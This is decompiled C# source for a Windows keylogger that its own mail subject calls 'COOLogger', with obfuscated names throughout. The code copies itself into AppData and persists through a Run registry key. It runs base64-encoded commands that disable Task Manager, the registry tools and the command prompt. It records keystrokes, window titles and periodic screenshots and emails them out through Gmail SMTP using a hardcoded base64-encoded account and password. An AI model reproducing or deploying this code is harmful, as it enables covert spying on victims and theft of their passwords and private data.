using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class cUsIBkTVpSXkuQd
{
	private static string RDeBzbJaMQqQbVn = "ZHViZHViMTMzN0BnbWFpbC5jb20=";

	private static string NkGeXTevKfTdBvZ = "ZHViZHViMTIz";

	private static string aHbgoeKTTSXtBIm = "smtp.gmail.com";

	private static int zyPSVNlBtdMOiLQ = 587;

	private static string eETLvdfzchvGanb;

	private static string NoLKlTkXbBbYSkh;

	private static string FayqnyQeznwVQsu;

	private static string bvBJyennmrOVcHU;

	private static string TjmphGVOxgiDfjx;

	private static string vlRaaZePIPtHGWZ;

	private static int JUPgQmWhnjuMaij = 1200000;

	private static string tQcqYpbfGtqkDzX = null;

	private static string nrulLaTDkmIkoDN = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string hviVvSRtaseiIit = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string nGDZvUMIUkzVJSp = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object daJWvvXfsUnTrJj = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string tRMpqXewFuaVWUZ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage LRYpQPfVYPoRwuc = new MailMessage();

	private static SmtpClient UyjeTneVitcbPBc = new SmtpClient();

	[AccessedThroughProperty("kUQFZPGUeNNzmOk")]
	private static yLZHYKOocaUmjGc _kUQFZPGUeNNzmOk;

	private static object yKNcxyISNqGZsMH = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox IlQzvkFvmzKssgS = new RichTextBox();

	private static yLZHYKOocaUmjGc kUQFZPGUeNNzmOk
	{
		get
		{
			return _kUQFZPGUeNNzmOk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_kUQFZPGUeNNzmOk != null)
			{
				yLZHYKOocaUmjGc.KeyDown -= dgYwMFoXZtWboyU;
			}
			_kUQFZPGUeNNzmOk = value;
			if (_kUQFZPGUeNNzmOk != null)
			{
				yLZHYKOocaUmjGc.KeyDown += dgYwMFoXZtWboyU;
			}
		}
	} = new yLZHYKOocaUmjGc();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		vlRaaZePIPtHGWZ = Conversions.ToString(true);
		FayqnyQeznwVQsu = Conversions.ToString(true);
		bvBJyennmrOVcHU = Conversions.ToString(true);
		TjmphGVOxgiDfjx = Conversions.ToString(true);
		NoLKlTkXbBbYSkh = Conversions.ToString(true);
		eETLvdfzchvGanb = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, daJWvvXfsUnTrJj, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(daJWvvXfsUnTrJj, (object)"\\lsJkjzpsjJlROwk.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(tRMpqXewFuaVWUZ + "\\lsJkjzpsjJlROwk.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(eETLvdfzchvGanb))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(yKNcxyISNqGZsMH)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(yKNcxyISNqGZsMH), Operators.ConcatenateObject(Operators.ConcatenateObject(daJWvvXfsUnTrJj, (object)"\\"), yKNcxyISNqGZsMH));
			}
		}
		if (Conversions.ToBoolean(NoLKlTkXbBbYSkh))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(daJWvvXfsUnTrJj, (object)"\\lsJkjzpsjJlROwk.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(FayqnyQeznwVQsu))
		{
			Interaction.Shell(hVHiFEfNeQUuUfZ(nrulLaTDkmIkoDN), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(bvBJyennmrOVcHU))
		{
			Interaction.Shell(hVHiFEfNeQUuUfZ(hviVvSRtaseiIit), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(TjmphGVOxgiDfjx))
		{
			Interaction.Shell(hVHiFEfNeQUuUfZ(nGDZvUMIUkzVJSp), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(1200000);
		val.add_Tick((EventHandler)wLsKvzZOLFXUrNl_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)rnzDRmoxIDfvOiC_Ticked);
		val2.Start();
		kUQFZPGUeNNzmOk.BGDORgCDMWRuKdw();
		Application.Run();
	}

	private static string xTUeCiMcIPipfLG()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string hVHiFEfNeQUuUfZ(string ObaqtwoNcVGnpKm)
	{
		byte[] bytes = Convert.FromBase64String(ObaqtwoNcVGnpKm);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void wLsKvzZOLFXUrNl_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(vlRaaZePIPtHGWZ))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = OhbRwGGFKunuZml(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(daJWvvXfsUnTrJj, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(daJWvvXfsUnTrJj, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn));
				mailMessage.To.Add(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = IlQzvkFvmzKssgS.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn), hVHiFEfNeQUuUfZ(NkGeXTevKfTdBvZ));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				IlQzvkFvmzKssgS.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage lRYpQPfVYPoRwuc = LRYpQPfVYPoRwuc;
		lRYpQPfVYPoRwuc.From = new MailAddress(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn));
		lRYpQPfVYPoRwuc.To.Add(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn));
		lRYpQPfVYPoRwuc.Subject = "COOLogger Logs from - " + Environment.UserName;
		lRYpQPfVYPoRwuc.Body = IlQzvkFvmzKssgS.get_Text();
		lRYpQPfVYPoRwuc = null;
		SmtpClient uyjeTneVitcbPBc = UyjeTneVitcbPBc;
		uyjeTneVitcbPBc.Host = "smtp.gmail.com";
		uyjeTneVitcbPBc.Port = 587;
		uyjeTneVitcbPBc.EnableSsl = true;
		uyjeTneVitcbPBc.Credentials = new NetworkCredential(hVHiFEfNeQUuUfZ(RDeBzbJaMQqQbVn), hVHiFEfNeQUuUfZ(NkGeXTevKfTdBvZ));
		uyjeTneVitcbPBc.Send(LRYpQPfVYPoRwuc);
		uyjeTneVitcbPBc = null;
		IlQzvkFvmzKssgS.set_Text("");
	}

	public static void dgYwMFoXZtWboyU(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox ilQzvkFvmzKssgS = IlQzvkFvmzKssgS;
		ilQzvkFvmzKssgS.set_Text(ilQzvkFvmzKssgS.get_Text() + kUQFZPGUeNNzmOk.GzpVeediTMTxLKa(e));
	}

	public static void rnzDRmoxIDfvOiC_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(tQcqYpbfGtqkDzX, xTUeCiMcIPipfLG(), false) != 0)
		{
			tQcqYpbfGtqkDzX = xTUeCiMcIPipfLG();
			if (Operators.CompareString(tQcqYpbfGtqkDzX, "", false) != 0)
			{
				RichTextBox ilQzvkFvmzKssgS = IlQzvkFvmzKssgS;
				ilQzvkFvmzKssgS.set_Text(ilQzvkFvmzKssgS.get_Text() + "\r\n\r\n~~~~~" + tQcqYpbfGtqkDzX + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string OhbRwGGFKunuZml(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
